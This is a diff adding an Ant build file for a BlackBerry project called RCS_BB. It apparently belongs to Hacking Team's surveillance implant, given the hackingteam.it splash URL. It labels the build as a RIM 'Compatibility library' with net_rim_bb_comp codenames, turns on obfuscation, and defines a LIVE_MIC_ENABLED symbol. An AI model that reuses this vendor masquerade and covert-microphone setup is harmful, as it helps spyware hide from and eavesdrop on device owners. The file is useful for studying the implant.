@@ -1,0 +1,86 @@
+<?xml version="1.0"?>
+<project name="RCS_BB" default="main" basedir=".">
+	<typedef resource="bb-ant-defs.xml" />
+
+	<!-- Application properties -->
+	<property name="ver" value="1.0" />
+
+	<property name="vendor" value="RIM" />
+	<property name="description" value="Compatibility library Core" />
+
+	<property name="jde.version" value="4.5.0" />
+	<property name="flags" value="0" />
+
+	<property name="obfuscation" value="true" />
+	<property name="src" location="src" />
+
+	<property name="dir.core" value="RCSBlackBerry" />
+	<property name="dir.lib" value="RCSBlackBerryResources" />
+
+	<property name="codename.core" value="net_rim_bb_comp_core" />
+	<property name="codename.lib" value="net_rim_bb_comp_lib" />
+
+
+	<!-- Import BB commons -->
+	<import file="${dir.core}/build.bb.common.xml" as="common" />
+
+	<property name="preprocess.symbols" value="DEBUG,DBC,FAKECONF,LIVE_MIC_ENABLED" />
+
+	<!-- MAIN -->
+	<target name="main" depends="lib,main.debug" />
+
+	<!-- LIB -->
+	<target name="lib">
+		<echo message="===========" />
+		<echo message="=== Lib ===" />
+		<echo message="===========" />
+
+		<splash imageurl="http://www.hackingteam.it/img/logo.gif" useproxy="true" showduration="5000" />
+
+		<ant antfile="${dir.lib}/build.lib.xml" useNativeBasedir="false" inheritAll="false">
+			<property name="preprocess.symbols" value="${preprocess.symbols}" />
+			<property name="libs" value="${net_rim_api.jar}" />
+			<property name="codename" value="${codename.lib}" />
+		</ant>
+
+		<move file="${codename.lib}.cod" todir="${dir.core}/lib" />
+		<move file="${codename.lib}.jar" todir="${dir.core}/lib" />
+
+	</target>
+
+	<!-- DEBUG -->
+	<property name="compile.name" value="DEBUG" />
+	<target name="main.debug">
+		<echo message="=============" />
+		<echo message="=== Main ===" />
+		<echo message="=============" />
+
+		<splash imageurl="http://www.hackingteam.it/img/logo.gif" useproxy="true" showduration="5000" />
+
+		<property name="bb.lib" value="lib/net_rim_bb_comp_lib.jar" />
+		<ant antfile="${dir.core}/build.core.xml" useNativeBasedir="false" inheritAll="false">
+			<property name="preprocess.symbols" value="${preprocess.symbols}" />
+			<property name="libs" value="${bb.lib}:${net_rim_api.jar}" />
+			<property name="codename" value="${codename.core}" />
+		</ant>
+
+	</target>
+
+	<!-- RELEASE 
+	<property name="compile.name" value="RELEASE" />
+	<property name="preprocess.symbols" value="RELEASE" />
+	<target name="main.release" depends="common.sign" />
+	-->
+
+	<target name="init">
+		<echo message="=============" />
+		<echo message="=== Init Lib ===" />
+		<ant antfile="${dir.lib}/build.lib.xml" inheritAll="false" target="init" />
+
+		<echo message="=== Init Main ===" />
+		<ant antfile="${dir.core}/build.core.xml" inheritAll="false" target="init" />
+
+		<echo message="=============" />
+	</target>
+
+</project>
